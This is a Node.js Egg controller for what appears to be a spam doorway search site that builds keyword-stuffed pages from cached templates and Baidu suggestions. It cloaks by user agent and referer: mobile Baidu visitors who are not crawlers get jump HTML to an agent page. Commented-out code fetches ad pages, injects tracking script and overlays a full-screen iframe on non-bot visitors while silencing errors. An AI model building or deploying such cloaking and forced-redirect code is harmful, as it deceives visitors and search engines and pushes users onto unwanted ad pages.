'usestrict';
const egg = require('egg');
const http = require('http')
var moment = require('moment')
moment.locale('zh-CN');
var iconv = require("iconv-lite"); //解码用的
iconv.skipDecodeWarning = true;
const fs = require("fs");
const axios = require('axios')

const getWordList = async function ({ word = '' }) {
  return new Promise((resolve, reject) => {
    http.get(`http://suggestion.baidu.com/su?wd=${word}`, function (res) {
      res.pipe(iconv.decodeStream('gbk')).collect(function (err, decodedBody) {
        // 对结果进行处理
        let vals = decodedBody.slice(decodedBody.indexOf(',s:') + 3, decodedBody.indexOf('})'))
        let arrays = []
        if (vals && vals.length > 0) {
          try {
            arrays = JSON.parse(vals)
            if (arrays.length > 0) {
              arrays.unshift(word)
              arrays = Array.from(new Set(arrays.slice(0, 5)))
            }
          } catch {
            console.log('格式错误')
          }
        }
        resolve(arrays)
      });
    }).on('error', function (error) {
      resolve([])
    });
  })
}
const randomWord = function (randomFlag, min, max) {
  let str = "",
    range = min,
    arr = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '3', '4', '5', '6', '7', '8', '9'];
  // 随机产生
  if (randomFlag) {
    range = Math.round(Math.random() * (max - min)) + min;
  }
  for (var i = 0; i < range; i++) {
    let pos = Math.round(Math.random() * (arr.length - 1));
    str += arr[pos];
  }
  return str;
}
module.exports = class SoController extends egg.Controller {
  async so() {
    const { ctx } = this;
    let { domain } = await ctx.service.utils.getSiteInfo();
    if (!domain) return ctx.body = '<h1>SO错误Domain<h1>'
    if(!domain.isSo) return  ctx.render('404c.html',{domain});
    let gaDOm = ''
    if (domain.agentLink.gajs) gaDOm = domain.agentLink.gajs;
    let referer = ctx.request.header['referer'];
    let isRefer = false
    var regexp = new RegExp("\.(baidu|sogou|so|google|bing)(\.(com|cn))","ig")
    isRefer = regexp.test(referer)
    let jumpHTML = '';
    if ((domain.browserType == 'baidu' && domain.isMobile && !domain.spider&&domain.isOpenUrl > -1) || domain.isOpenUrl == 3) {
      jumpHTML = this.ctx.app.config.common.JUMPHTML(`/html/${domain.agentLink.agentPageName}.html`)
      // ctx.status = 403
      // if (domain.agentLink.isAgentPage) {
      //   let agentPageName = '/app/public/html/'+domain.agentLink.agentPageName + '.html';
      //   let agentPageFilePath = process.cwd() + agentPageName
      //   let isHaveagentFile = fs.existsSync(agentPageFilePath)
      //   if(isHaveagentFile){
      //     let text = fs.readFileSync(agentPageFilePath, 'utf-8');
      //     text = text.replace('</body>',`${gaDOm}</body>`)
      //     if(text){
      //       text = text.replace('</body>',`${gaDOm}</body>`).replace('<title>',`<title>${domain.title}`)
      //       .replace(`content="description"`,`content="${domain.description}"`)
      //       .replace('HDESC',domain.description)
      //       return this.ctx.body = text
      //     }
      //   }
        // let agentPageName = domain.agentLink.agentPageName + domain.agentLink._id + '.json' || 'index.json';
        // let agentPageFilePath = process.cwd() + '/app/public/agentpage/' + agentPageName
        // let isHaveagentFile = fs.existsSync(agentPageFilePath)
        // // 如果开启了缓存并且有缓存文件直接返回
        // let isHaveList = false;
        // let txtpage = '';
        // if (isHaveagentFile) {
        //   let text = fs.readFileSync(agentPageFilePath, 'utf-8');
        //   let datac = JSON.parse(text);
        //   txtpage = datac.txtpage;
        //   let chaTime = new Date().getTime() - new Date(datac.updateCacheTime).getTime();
        //   if (chaTime >= this.ctx.app.config.common.AGENT_PAGE || chaTime < 0) {
        //     isHaveList = false
        //   } else {
        //     isHaveList = true
        //   }
        // }
        // let pageurl = domain.agentLink.openUrlH5.replace(/##/g, '');
        // if (!isHaveList && pageurl) {
        //   axios.get(pageurl).then((res) => {
        //     if (res && res.data && res.data.length > 0 && res.data.indexOf('script') > 0) {
        //       // if (isHaveagentFile) {
        //       //   fs.unlinkSync(agentPageFilePath);
        //       // }
        //       try{fs.unlinkSync(agentPageFilePath);}catch{}
        //       let savehtml = res.data.replace('</body>', domain.agentLink.gajs + '</body>')
        //       let savelist = {
        //         updateCacheTime: Date.now(),
        //         txtpage: savehtml
        //       }
        //       fs.writeFile(agentPageFilePath, JSON.stringify(savelist), null, function (err) { });
        //       fs.writeFile(process.cwd() + '/app/public/agentpage/' +  domain.agentLink.agentPageName+domain.agentLink._id + '.html', savehtml, null, function (err) { });

        //     }
        //   }).catch(()=>{
        //     console.log('广告地址请求错误1.30！')
        //   })
        // }
        // if (txtpage) {
        //   return this.ctx.body = txtpage
        // }
      // }
      // return ctx.body = `
      // <!doctype html>
      //   <html>
      // <head>
      //   <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
      // </head>
      // <body>
      // <script>
      //   window.onerror = function() {
      //     return true;
      //   }
      //   if (!/(bot|spider)/i.test(navigator.userAgent)) {
      //     var tantiao = '${domain.agentLink.openUrlH5}';
      //     var tantiaouml = tantiao.replace(/##/g, '');
      //     document.writeln('<iframe frameborder="0" style="margin:0;padding:0;position:fixed;z-index:10000;top:0;left:0;width:100%;height:100%;overflow:auto;" src="'+tantiaouml+'"></iframe>');
      //   }
      //   </script>
      //  ${domain.agentLink.gajs}
      // </body>
      // </html>
      // `
    }
    let keywordlength = 250
    let searchval = ctx.params.id
    var pattern = /[`~!@#_$%^&*()=|{}':;',\\\[\\\].<>/?~！@#￥……&*（）——|{}【】‘；：”“'。，、？\s]|html/g
    // 验证搜索词条件
    if (searchval) {
      if(searchval.length > keywordlength) return ctx.render('404.html',{domain});
      searchval = searchval.replace(pattern, '')
    }
    let fanIndex = 1
    let hostArr = []
    let fanNum = 0;
    let f_item = {
      title: '',
      keywords: '',
      description: ''
    }

    let fileName = ctx.url
    if (fileName) {
      hostArr = fileName.split('');
    }
    hostArr.forEach((item) => {
      fanIndex += (1 + item.charCodeAt(0))
    })

    if (domain.fcid && domain.fcid.num) {
      fanNum = domain.fcid.num
    };
    if (fanNum > 0) {
      let indexB = fanIndex % fanNum;
      if(!searchval){
        indexB = new Date().getTime()% fanNum;
      }
      //先去缓存fan文件里面查找泛的 分类id-泛索引indexB 命名的json 文件
      let fanFileName = domain.fcid._id + '-' + indexB
      let FanPageFilePath = this.ctx.app.config.cacheFile + 'fan/' + fanFileName
      try {
        let f_item_text = fs.readFileSync(FanPageFilePath + '.json', 'utf-8');
        if (f_item_text) {
          f_item = JSON.parse(f_item_text)
        }
      } catch (e) {
        f_item = await ctx.model.Fan.findOne({
          index: indexB,
          fcid: domain.fcid._id
        })
        if (f_item) {
          fs.writeFile(FanPageFilePath + '.json', JSON.stringify(f_item), null, function (err) { });
        }
      }
    }
    let imageNums = 400 + fanIndex
    imageNums = imageNums % (400 - 16);
    if (f_item.description) {
      f_item.description = f_item.description.replace(/\[域名\]|域名/g, domain.fullDomain)
      f_item.description = f_item.description.replace(/\[数字\]|数字/g, imageNums)
    }
    if(!searchval&&f_item.title){
      let titArr = f_item.title.split(pattern)
      searchval = titArr[0]
    }
    if(domain.titleType==1){
      f_item.title = domain.fullDomain+ctx.url
    }
    return ctx.render('/so.html', {
      sodomain: f_item,
      domain,
      imageNums,
      searchval,
      jumpHTML
    });
  }
}


